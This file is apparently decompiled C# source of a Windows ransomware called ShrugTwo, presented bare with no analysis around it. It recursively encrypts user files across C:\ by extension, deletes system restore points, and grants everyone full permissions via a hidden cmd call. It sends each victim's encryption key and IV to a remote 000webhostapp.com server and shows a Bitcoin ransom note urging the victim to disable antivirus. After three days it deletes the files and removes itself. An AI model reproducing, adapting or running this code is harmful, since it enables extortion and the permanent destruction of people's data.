using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using IWshRuntimeLibrary;
using Microsoft.Win32;
using ShrugTwo.Properties;

namespace ShrugTwo;

public class CoreForm : Form
{
	private enum ThreadMode
	{
		Encrypt,
		Decrypt,
		Delete
	}

	private string UniqueIdentifier;

	private DateTime InstallDate;

	private DateTime DeleteDate;

	private Cryptor CryptorLib;

	private List<string> FilesToHarm = new List<string>();

	private List<string> HarmedFiles = new List<string>();

	private bool Debug = false;

	private IContainer components = null;

	private Timer DecreaseRemainingTime;

	private PictureBox pb_Padlock;

	private Label lbl_Ooops;

	private WebBrowser wb_Information;

	private Label lbl_AreYouProud;

	private Panel pnl_Crucial;

	private Button btn_Copy;

	private Label lbl_SendTo;

	private TextBox txt_SendTo;

	private PictureBox pb_BitcoinAcceptedHere;

	private Button btn_CheckPayment;

	private Label lbl_YourWallet;

	private TextBox txt_Wallet;

	private Label lbl_LostOn;

	private Panel pnl_Time;

	private Label lbl_DateDelete;

	private Label lbl_TimeSpanLeft;

	private Label lbl_TimeLeft;

	private Button btn_Paid;

	public CoreForm()
	{
		InitializeComponent();
	}

	[DllImport("Srclient.dll")]
	public static extern int SRRemoveRestorePoint(int index);

	private void CoreForm_Load(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Invalid comparison between Unknown and I4
		((Control)this).Hide();
		((Form)this).set_Icon(Resources.AppIcon);
		if (Debug && (int)MessageBox.Show("Are you sure?", "Debug", (MessageBoxButtons)4) != 6)
		{
			Application.Exit();
		}
		while (!ConnectedToTheInternet() && !ConnectedToTheInternet())
		{
		}
		BetterReg betterReg = new BetterReg(Registry.CurrentUser, "", write: true);
		if (betterReg.SubKeyExists("ShrugTwo"))
		{
			betterReg.OpenSubKey("ShrugTwo", write: true);
			UniqueIdentifier = betterReg.ReadValueStr("identifier");
			InstallDate = DateTimeFromString(betterReg.ReadValueStr("installdate"));
			CryptorLib = new Cryptor(betterReg.ReadValueStr("crykey"), betterReg.ReadValueStr("cryiv"));
		}
		else
		{
			betterReg.AddSubKey("ShrugTwo", redirect: true, write: true);
			Random random = new Random();
			InstallDate = DateTime.Now;
			UniqueIdentifier = Environment.UserName + "/" + random.Next(10000, 99999);
			CryptorLib = new Cryptor();
			betterReg.SetValue("identifier", UniqueIdentifier);
			betterReg.SetValue("installdate", DateTimeToString(InstallDate));
			betterReg.SetValue("crykey", CryptorLib.Key);
			betterReg.SetValue("cryiv", CryptorLib.IV);
			try
			{
				GrantAllPerms();
			}
			catch (Exception)
			{
			}
			try
			{
				DeleteRestorePoints();
			}
			catch (Exception)
			{
			}
			PrepareAndRunThreads(ThreadMode.Encrypt);
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection["partA"] = UniqueIdentifier;
			nameValueCollection["partB"] = CryptorLib.Key;
			nameValueCollection["partC"] = CryptorLib.IV;
			nameValueCollection["partD"] = DateTimeToString(DateTime.Now);
			try
			{
				WebRequest("http://tempacc11vl.000webhostapp.com/marthas_stuff/uphash.php", nameValueCollection);
			}
			catch (Exception)
			{
			}
			CreateShortcut();
		}
		DeleteDate = InstallDate;
		if (Debug)
		{
			DeleteDate = DeleteDate.AddMinutes(5.0);
		}
		else
		{
			DeleteDate = DeleteDate.AddDays(3.0);
		}
		((Control)lbl_DateDelete).set_Text(DateTimeToString(DeleteDate));
		wb_Information.set_DocumentText("<!DOCTYPE html></head><body><font face=\"Microsoft Sans Serif\" size=\"2\"><h3>What happened?</h3><p><b>Y</b>our important files have been encrypted.</br>Many of your documents, pictures, videos, databases, scripts,</br>codes, presentations are no longer accessible because they</br>have been encrypted. Maybe you're busy looking for a way to</br>recover your stuff, but don't waste your time. Nobody can do</br>that without our decryption service.</p><h3>Can I recover my files?</h3><p><b>O</b>f course!</br>We guarantee that you can recover all your files safely and</br>easily. But you don't have too much\ttime. If you want to</br>decrypt everything, you will need to pay. You only have 3</br>days to submit the payment, otherwise all your files will be</br><b>PERMANENTLY</b> deleted. Lost. Forever.</p><h3>How do I pay?</h3><p><b>P</b>ayment is accepted in Bitcoin only.</br>Use your favorite search engine (Google, DuckDuckGo, etc.)</br>to learn more about Bitcoin. To send a payment, you will need</br>a Bitcoin wallet. You can create one at Blockchain.com for</br>free. After creating your wallet, buy some Bitcoins (amount</br>is specified down below) and send the correct amount to the</br>address specified in this window. After your payment, click</br>[Check Payment]. The best time to check is around 8-10pm GMT.</p><h3>IMPORTANT:</h3><p><b>Disable or uninstall your anti-virus until your files</br>are recovered (or gone). Antivirus might delete this window</br>making it impossible to recover your stuff.</b></p></font></body></html>");
		((Control)this).Show();
		DecreaseRemainingTime.Start();
	}

	private void CreateShortcut()
	{
		WshShell wshShell = (WshShell)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8")));
		string pathLink = "C:\\Users\\" + Environment.UserName + "\\Desktop\\@ShrugDecryptor@.lnk";
		IWshShortcut wshShortcut = (IWshShortcut)(dynamic)wshShell.CreateShortcut(pathLink);
		wshShortcut.Description = "Shortcut for @ShrugDecryptor@.exe";
		wshShortcut.TargetPath = Application.get_ExecutablePath();
		wshShortcut.Save();
	}

	private void GrantAllPerms()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "/C Icacls . /grant Everyone:F /T /C /Q";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
	}

	private bool ConnectedToTheInternet()
	{
		bool flag = false;
		try
		{
			using WebClient webClient = new WebClient();
			using (webClient.OpenRead("http://clients3.google.com/generate_204"))
			{
				return true;
			}
		}
		catch (Exception)
		{
			return false;
		}
	}

	private string WebRequest(string url, NameValueCollection nvc)
	{
		using WebClient webClient = new WebClient();
		try
		{
			byte[] bytes = webClient.UploadValues(url, nvc);
			return Encoding.UTF8.GetString(bytes);
		}
		catch (Exception)
		{
			return "Fail at WebRequest(string, NameValueConnection)";
		}
	}

	private string DateTimeToString(DateTime dt)
	{
		string text = "";
		CultureInfo cultureInfo = new CultureInfo("en-US");
		return dt.ToString("dd/MM/yyyy HH:mm:ss", cultureInfo);
	}

	private DateTime DateTimeFromString(string dt)
	{
		DateTime now = DateTime.Now;
		CultureInfo provider = new CultureInfo("en-US");
		return DateTime.ParseExact(dt, "dd/MM/yyyy HH:mm:ss", provider);
	}

	private void EnumerateFile(string fileDir, ref List<string> list)
	{
		list.Add(fileDir);
	}

	private void EnumerateFiles(string parentDir, List<string> exts, ref List<string> list)
	{
		string[] files = Directory.GetFiles(parentDir);
		string[] directories = Directory.GetDirectories(parentDir);
		string[] array = files;
		foreach (string text in array)
		{
			try
			{
				string extension = Path.GetExtension(text);
				if (exts.Contains(extension.Replace(".", "")))
				{
					EnumerateFile(text, ref list);
				}
			}
			catch (Exception)
			{
			}
		}
		string[] array2 = directories;
		foreach (string parentDir2 in array2)
		{
			try
			{
				EnumerateFiles(parentDir2, exts, ref list);
			}
			catch (Exception)
			{
			}
		}
	}

	private void EncryptFile(string file)
	{
		try
		{
			byte[] bytesToEncode = File.ReadAllBytes(file);
			byte[] bytes = CryptorLib.EncodeBytes(bytesToEncode);
			File.WriteAllBytes(file, bytes);
			File.Move(file, file + ".SHRUG2");
		}
		catch (Exception)
		{
		}
	}

	private void EncryptFiles(List<string> Files)
	{
		foreach (string File in Files)
		{
			try
			{
				EncryptFile(File);
			}
			catch (Exception)
			{
			}
		}
	}

	private void DecryptFile(string path)
	{
		try
		{
			byte[] encryptedBytes = File.ReadAllBytes(path);
			byte[] bytes = CryptorLib.DecodeBytes(encryptedBytes);
			File.WriteAllBytes(path, bytes);
			string extension = Path.GetExtension(path);
			string destFileName = path.Substring(0, path.Length - extension.Length);
			File.Move(path, destFileName);
		}
		catch (Exception)
		{
		}
	}

	private void DecryptFiles(List<string> Files)
	{
		foreach (string File in Files)
		{
			if (System.IO.File.Exists(File))
			{
				try
				{
					DecryptFile(File);
				}
				catch (Exception)
				{
				}
			}
		}
	}

	private void DeleteFiles(List<string> Files)
	{
		foreach (string File in Files)
		{
			if (System.IO.File.Exists(File))
			{
				try
				{
					System.IO.File.Delete(File);
				}
				catch (Exception)
				{
				}
			}
		}
	}

	private void DeleteRestorePoints()
	{
		for (int i = 0; i < 50; i++)
		{
			try
			{
				SRRemoveRestorePoint(i);
			}
			catch (Exception)
			{
			}
		}
	}

	private static IEnumerable<ICollection<T>> Split<T>(IEnumerable<T> src, int maxItems)
	{
		List<T> list = new List<T>();
		foreach (T t in src)
		{
			list.Add(t);
			if (list.Count == maxItems)
			{
				yield return list;
				list = new List<T>();
			}
		}
		if (list.Count > 0)
		{
			yield return list;
		}
	}

	private void PrepareAndRunThreads(ThreadMode tMode)
	{
		//IL_03f0: Unknown result type (might be due to invalid IL or missing references)
		ThreadPool.GetMaxThreads(out var workerThreads, out var _);
		if (workerThreads >= 2)
		{
			workerThreads = (int)Math.Floor((double)(workerThreads * 3 / 4));
		}
		List<ICollection<string>> list = new List<ICollection<string>>();
		if (tMode == ThreadMode.Encrypt)
		{
			List<string> exts = new List<string>
			{
				"txt", "docx", "xls", "doc", "xlsx", "ppt", "pptx", "odt", "jpg", "png",
				"jpeg", "csv", "psd", "sql", "mdb", "db", "sln", "html", "php", "asp",
				"aspx", "html", "xml", "json", "dat", "cpp", "cs", "py", "pyw", "c",
				"js", "java", "mp4", "ogg", "mp3", "wmv", "avi", "gif", "mpeg", "msi",
				"zip", "rar", "7zip", "7z", "bmp", "apk", "yml", "qml", "py3", "aif",
				"cda", "mpa", "wpl", "mid", "midi", "pkg", "deb", "arj", "z", "o",
				"rpm", "tar.gz", "gz", "dbf", "yml", "tar", "pl", "rb", "ico", "tiff",
				"tif", "asp", "xhtml", "rss", "jsp", "htm"
			};
			EnumerateFiles("C:\\", exts, ref FilesToHarm);
			list = Split(FilesToHarm, (int)Math.Floor((double)(FilesToHarm.Count / workerThreads))).ToList();
		}
		else
		{
			List<string> exts2 = new List<string> { "SHRUG2" };
			EnumerateFiles("C:\\", exts2, ref HarmedFiles);
			if (Debug)
			{
				MessageBox.Show(string.Join("\n", HarmedFiles));
			}
			list = Split(HarmedFiles, (int)Math.Floor((double)(HarmedFiles.Count / workerThreads))).ToList();
		}
		switch (tMode)
		{
		case ThreadMode.Encrypt:
		{
			foreach (List<string> groupOfX in list)
			{
				Thread thread3 = new Thread((ThreadStart)delegate
				{
					EncryptFiles(groupOfX);
				});
				thread3.Start();
			}
			break;
		}
		case ThreadMode.Decrypt:
		{
			foreach (List<string> groupOfX2 in list)
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					DecryptFiles(groupOfX2);
				});
				thread2.Start();
			}
			break;
		}
		case ThreadMode.Delete:
		{
			foreach (List<string> groupOfX3 in list)
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					DeleteFiles(groupOfX3);
				});
				thread.Start();
			}
			break;
		}
		}
	}

	private void SelfDestruction()
	{
		try
		{
			BetterReg betterReg = new BetterReg(Registry.CurrentUser, "", write: true);
			betterReg.DeleteSubKey("ShrugTwo", tree: true);
		}
		catch (Exception)
		{
		}
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Application.get_ExecutablePath();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Application.Exit();
	}

	private void CoreForm_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_CloseReason() == 3)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void btn_Copy_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(((Control)txt_SendTo).get_Text());
	}

	private void btn_CheckPayment_Click(object sender, EventArgs e)
	{
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		string address = "http://tempacc11vl.000webhostapp.com/marthas_stuff/freehashes.txt";
		try
		{
			using WebClient webClient = new WebClient();
			string text = webClient.DownloadString(address);
			if (text.Contains(UniqueIdentifier))
			{
				DecreaseRemainingTime.Stop();
				MessageBox.Show("Payment is valid. Wait some time while we decrypt your files...");
				((Control)this).Hide();
				try
				{
					PrepareAndRunThreads(ThreadMode.Decrypt);
				}
				catch (Exception)
				{
				}
				MessageBox.Show("Files were decrypted. Click OK to completely remove the ransomware.");
				SelfDestruction();
			}
			else
			{
				MessageBox.Show("Payment not valid yet.");
			}
		}
		catch (Exception)
		{
		}
	}

	private void btn_Paid_Click(object sender, EventArgs e)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		((Control)txt_Wallet).set_Text("");
		MessageBox.Show("Payment verification sent. Wait until we confirm it.");
		NameValueCollection nameValueCollection = new NameValueCollection();
		nameValueCollection["partA"] = UniqueIdentifier;
		nameValueCollection["partB"] = ((Control)txt_Wallet).get_Text();
		try
		{
			WebRequest("http://tempacc11vl.000webhostapp.com/marthas_stuff/upoldhash.php", nameValueCollection);
		}
		catch (Exception)
		{
		}
	}

	private void DecreaseRemainingTime_Tick(object sender, EventArgs e)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		if (DateTime.Now > DeleteDate)
		{
			try
			{
				PrepareAndRunThreads(ThreadMode.Delete);
				DecreaseRemainingTime.Stop();
				MessageBox.Show("Time has expired. Say goodbye to your files.");
				SelfDestruction();
				Application.Exit();
				return;
			}
			catch (Exception)
			{
				return;
			}
		}
		TimeSpan timeSpan = DeleteDate.Subtract(DateTime.Now);
		((Control)lbl_TimeSpanLeft).set_Text($"{timeSpan.Days}d {timeSpan.Hours:00}h {timeSpan.Minutes:00}m {timeSpan.Seconds:00}s");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_01cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d6: Expected O, but got Unknown
		//IL_02cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d6: Expected O, but got Unknown
		//IL_0569: Unknown result type (might be due to invalid IL or missing references)
		//IL_0573: Expected O, but got Unknown
		//IL_05fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0606: Expected O, but got Unknown
		//IL_06cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_06d6: Expected O, but got Unknown
		//IL_07c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_07d3: Expected O, but got Unknown
		//IL_08fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0906: Expected O, but got Unknown
		//IL_098e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0998: Expected O, but got Unknown
		//IL_0a1b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a25: Expected O, but got Unknown
		//IL_0bd4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bde: Expected O, but got Unknown
		components = new Container();
		DecreaseRemainingTime = new Timer(components);
		pb_Padlock = new PictureBox();
		lbl_Ooops = new Label();
		wb_Information = new WebBrowser();
		lbl_AreYouProud = new Label();
		pnl_Crucial = new Panel();
		btn_CheckPayment = new Button();
		btn_Copy = new Button();
		lbl_YourWallet = new Label();
		lbl_SendTo = new Label();
		txt_Wallet = new TextBox();
		txt_SendTo = new TextBox();
		pb_BitcoinAcceptedHere = new PictureBox();
		lbl_LostOn = new Label();
		pnl_Time = new Panel();
		lbl_TimeSpanLeft = new Label();
		lbl_TimeLeft = new Label();
		lbl_DateDelete = new Label();
		btn_Paid = new Button();
		((ISupportInitialize)pb_Padlock).BeginInit();
		((Control)pnl_Crucial).SuspendLayout();
		((ISupportInitialize)pb_BitcoinAcceptedHere).BeginInit();
		((Control)pnl_Time).SuspendLayout();
		((Control)this).SuspendLayout();
		DecreaseRemainingTime.set_Interval(1000);
		DecreaseRemainingTime.add_Tick((EventHandler)DecreaseRemainingTime_Tick);
		pb_Padlock.set_Image((Image)(object)Resources.SadFace);
		((Control)pb_Padlock).set_Location(new Point(12, 12));
		((Control)pb_Padlock).set_Name("pb_Padlock");
		((Control)pb_Padlock).set_Size(new Size(182, 148));
		pb_Padlock.set_SizeMode((PictureBoxSizeMode)1);
		pb_Padlock.set_TabIndex(0);
		pb_Padlock.set_TabStop(false);
		((Control)lbl_Ooops).set_AutoSize(true);
		((Control)lbl_Ooops).set_Font(new Font("Microsoft Sans Serif", 14f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lbl_Ooops).set_ForeColor(Color.White);
		((Control)lbl_Ooops).set_Location(new Point(195, 10));
		((Control)lbl_Ooops).set_Name("lbl_Ooops");
		((Control)lbl_Ooops).set_Size(new Size(415, 24));
		((Control)lbl_Ooops).set_TabIndex(1);
		((Control)lbl_Ooops).set_Text("Ooops! Your files have been encrypted ಥ_ಥ");
		((Control)wb_Information).set_Location(new Point(200, 35));
		((Control)wb_Information).set_MinimumSize(new Size(20, 20));
		((Control)wb_Information).set_Name("wb_Information");
		wb_Information.set_ScriptErrorsSuppressed(true);
		((Control)wb_Information).set_Size(new Size(410, 300));
		((Control)wb_Information).set_TabIndex(2);
		((Control)lbl_AreYouProud).set_AutoSize(true);
		((Control)lbl_AreYouProud).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lbl_AreYouProud).set_ForeColor(Color.White);
		((Control)lbl_AreYouProud).set_Location(new Point(618, 36));
		((Control)lbl_AreYouProud).set_Name("lbl_AreYouProud");
		((Control)lbl_AreYouProud).set_Size(new Size(125, 52));
		((Control)lbl_AreYouProud).set_TabIndex(3);
		((Control)lbl_AreYouProud).set_Text("Are you proud of me,\r\npapa WannaCry?\r\nWhat about you,\r\nmomma NotPetya?");
		pnl_Crucial.set_BorderStyle((BorderStyle)1);
		((Control)pnl_Crucial).get_Controls().Add((Control)(object)btn_Paid);
		((Control)pnl_Crucial).get_Controls().Add((Control)(object)btn_CheckPayment);
		((Control)pnl_Crucial).get_Controls().Add((Control)(object)btn_Copy);
		((Control)pnl_Crucial).get_Controls().Add((Control)(object)lbl_YourWallet);
		((Control)pnl_Crucial).get_Controls().Add((Control)(object)lbl_SendTo);
		((Control)pnl_Crucial).get_Controls().Add((Control)(object)txt_Wallet);
		((Control)pnl_Crucial).get_Controls().Add((Control)(object)txt_SendTo);
		((Control)pnl_Crucial).get_Controls().Add((Control)(object)pb_BitcoinAcceptedHere);
		((Control)pnl_Crucial).set_ForeColor(Color.Black);
		((Control)pnl_Crucial).set_Location(new Point(200, 345));
		((Control)pnl_Crucial).set_Name("pnl_Crucial");
		((Control)pnl_Crucial).set_Size(new Size(410, 110));
		((Control)pnl_Crucial).set_TabIndex(4);
		((Control)btn_CheckPayment).set_Location(new Point(152, 81));
		((Control)btn_CheckPayment).set_Name("btn_CheckPayment");
		((Control)btn_CheckPayment).set_Size(new Size(120, 23));
		((Control)btn_CheckPayment).set_TabIndex(7);
		((Control)btn_CheckPayment).set_Text("[Check Payment]");
		((ButtonBase)btn_CheckPayment).set_UseVisualStyleBackColor(true);
		((Control)btn_CheckPayment).add_Click((EventHandler)btn_CheckPayment_Click);
		((Control)btn_Copy).set_Location(new Point(363, 17));
		((Control)btn_Copy).set_Name("btn_Copy");
		((Control)btn_Copy).set_Size(new Size(42, 21));
		((Control)btn_Copy).set_TabIndex(7);
		((Control)btn_Copy).set_Text("Copy");
		((ButtonBase)btn_Copy).set_UseVisualStyleBackColor(true);
		((Control)btn_Copy).add_Click((EventHandler)btn_Copy_Click);
		((Control)lbl_YourWallet).set_AutoSize(true);
		((Control)lbl_YourWallet).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lbl_YourWallet).set_ForeColor(Color.Gold);
		((Control)lbl_YourWallet).set_Location(new Point(152, 41));
		((Control)lbl_YourWallet).set_Name("lbl_YourWallet");
		((Control)lbl_YourWallet).set_Size(new Size(255, 13));
		((Control)lbl_YourWallet).set_TabIndex(5);
		((Control)lbl_YourWallet).set_Text("Put your wallet && click \"Paid\" after payment");
		((Control)lbl_SendTo).set_AutoSize(true);
		((Control)lbl_SendTo).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lbl_SendTo).set_ForeColor(Color.Gold);
		((Control)lbl_SendTo).set_Location(new Point(152, 2));
		((Control)lbl_SendTo).set_Name("lbl_SendTo");
		((Control)lbl_SendTo).set_Size(new Size(173, 13));
		((Control)lbl_SendTo).set_TabIndex(5);
		((Control)lbl_SendTo).set_Text("Send $70 worth of Bitcoin to:");
		((Control)txt_Wallet).set_Location(new Point(152, 57));
		((Control)txt_Wallet).set_Name("txt_Wallet");
		((Control)txt_Wallet).set_Size(new Size(252, 20));
		((Control)txt_Wallet).set_TabIndex(6);
		((Control)txt_SendTo).set_Font(new Font("Arial", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txt_SendTo).set_Location(new Point(152, 18));
		((Control)txt_SendTo).set_Name("txt_SendTo");
		((TextBoxBase)txt_SendTo).set_ReadOnly(true);
		((Control)txt_SendTo).set_Size(new Size(205, 20));
		((Control)txt_SendTo).set_TabIndex(6);
		((Control)txt_SendTo).set_Text("1Hr1grgH9ViEgUx73iRRJLVKH3PFjUteNx");
		pb_BitcoinAcceptedHere.set_Image((Image)(object)Resources.BitcoinAcceptedHere);
		((Control)pb_BitcoinAcceptedHere).set_Location(new Point(0, 21));
		((Control)pb_BitcoinAcceptedHere).set_Name("pb_BitcoinAcceptedHere");
		((Control)pb_BitcoinAcceptedHere).set_Size(new Size(147, 65));
		pb_BitcoinAcceptedHere.set_SizeMode((PictureBoxSizeMode)4);
		pb_BitcoinAcceptedHere.set_TabIndex(5);
		pb_BitcoinAcceptedHere.set_TabStop(false);
		((Control)lbl_LostOn).set_AutoSize(true);
		((Control)lbl_LostOn).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)lbl_LostOn).set_ForeColor(Color.Gold);
		((Control)lbl_LostOn).set_Location(new Point(4, 4));
		((Control)lbl_LostOn).set_Name("lbl_LostOn");
		((Control)lbl_LostOn).set_Size(new Size(172, 20));
		((Control)lbl_LostOn).set_TabIndex(5);
		((Control)lbl_LostOn).set_Text("Your files will be lost on");
		((Control)pnl_Time).get_Controls().Add((Control)(object)lbl_TimeSpanLeft);
		((Control)pnl_Time).get_Controls().Add((Control)(object)lbl_TimeLeft);
		((Control)pnl_Time).get_Controls().Add((Control)(object)lbl_DateDelete);
		((Control)pnl_Time).get_Controls().Add((Control)(object)lbl_LostOn);
		((Control)pnl_Time).set_Location(new Point(12, 166));
		((Control)pnl_Time).set_Name("pnl_Time");
		((Control)pnl_Time).set_Size(new Size(182, 169));
		((Control)pnl_Time).set_TabIndex(6);
		((Control)lbl_TimeSpanLeft).set_AutoSize(true);
		((Control)lbl_TimeSpanLeft).set_Font(new Font("Microsoft Sans Serif", 16f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)lbl_TimeSpanLeft).set_ForeColor(Color.White);
		((Control)lbl_TimeSpanLeft).set_Location(new Point(7, 134));
		((Control)lbl_TimeSpanLeft).set_Name("lbl_TimeSpanLeft");
		((Control)lbl_TimeSpanLeft).set_Size(new Size(168, 26));
		((Control)lbl_TimeSpanLeft).set_TabIndex(8);
		((Control)lbl_TimeSpanLeft).set_Text("0d 00h 00m 00s");
		((Control)lbl_TimeLeft).set_AutoSize(true);
		((Control)lbl_TimeLeft).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lbl_TimeLeft).set_ForeColor(Color.Gold);
		((Control)lbl_TimeLeft).set_Location(new Point(48, 95));
		((Control)lbl_TimeLeft).set_Name("lbl_TimeLeft");
		((Control)lbl_TimeLeft).set_Size(new Size(84, 20));
		((Control)lbl_TimeLeft).set_TabIndex(7);
		((Control)lbl_TimeLeft).set_Text("Time Left");
		((Control)lbl_DateDelete).set_AutoSize(true);
		((Control)lbl_DateDelete).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lbl_DateDelete).set_ForeColor(Color.White);
		((Control)lbl_DateDelete).set_Location(new Point(16, 41));
		((Control)lbl_DateDelete).set_Name("lbl_DateDelete");
		((Control)lbl_DateDelete).set_Size(new Size(149, 15));
		((Control)lbl_DateDelete).set_TabIndex(6);
		((Control)lbl_DateDelete).set_Text("dd/MM/yyyy HH:mm:ss");
		((Control)btn_Paid).set_Location(new Point(284, 81));
		((Control)btn_Paid).set_Name("btn_Paid");
		((Control)btn_Paid).set_Size(new Size(120, 23));
		((Control)btn_Paid).set_TabIndex(8);
		((Control)btn_Paid).set_Text("Paid");
		((ButtonBase)btn_Paid).set_UseVisualStyleBackColor(true);
		((Control)btn_Paid).add_Click((EventHandler)btn_Paid_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Maroon);
		((Form)this).set_ClientSize(new Size(749, 467));
		((Control)this).get_Controls().Add((Control)(object)pnl_Time);
		((Control)this).get_Controls().Add((Control)(object)pnl_Crucial);
		((Control)this).get_Controls().Add((Control)(object)lbl_AreYouProud);
		((Control)this).get_Controls().Add((Control)(object)wb_Information);
		((Control)this).get_Controls().Add((Control)(object)lbl_Ooops);
		((Control)this).get_Controls().Add((Control)(object)pb_Padlock);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("CoreForm");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("ShrugDecryptor");
		((Form)this).add_FormClosing(new FormClosingEventHandler(CoreForm_FormClosing));
		((Form)this).add_Load((EventHandler)CoreForm_Load);
		((ISupportInitialize)pb_Padlock).EndInit();
		((Control)pnl_Crucial).ResumeLayout(false);
		((Control)pnl_Crucial).PerformLayout();
		((ISupportInitialize)pb_BitcoinAcceptedHere).EndInit();
		((Control)pnl_Time).ResumeLayout(false);
		((Control)pnl_Time).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
